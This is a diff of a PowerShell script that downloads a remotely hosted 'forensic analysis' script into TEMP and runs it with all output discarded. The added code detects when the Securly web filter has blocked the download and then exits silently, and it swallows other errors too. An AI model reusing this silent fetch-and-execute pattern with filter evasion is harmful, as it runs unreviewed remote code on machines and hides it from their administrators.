@@ -118,8 +118,26 @@ try {
     # Step 1: Download and execute forensic analysis script
     $tempScriptPath = Join-Path $env:TEMP "Invoke-ForensicAnalysis.ps1"
     
-    # Download main script
-    Invoke-RestMethod -Uri $ScriptUrl -OutFile $tempScriptPath -UseBasicParsing -ErrorAction Stop | Out-Null
+    # Download main script with error handling
+    try {
+        $response = Invoke-WebRequest -Uri $ScriptUrl -UseBasicParsing -ErrorAction Stop
+        $content = if ($response.Content -is [byte[]]) { 
+            [System.Text.Encoding]::UTF8.GetString($response.Content) 
+        } else { 
+            $response.Content 
+        }
+        
+        # Check for web filter blocking
+        if ($content -match '<html|<HTML|<!DOCTYPE|Securly|web filter') {
+            # Silent failure - don't expose errors in production script
+            exit 0
+        }
+        
+        $content | Out-File -FilePath $tempScriptPath -Encoding UTF8 -Force
+    } catch {
+        # Silent failure - don't expose errors
+        exit 0
+    }
     
     # Execute (defaults to CSV which generates ZIP file)
     & $tempScriptPath -OutputPath $OutputPath *>&1 | Out-Null
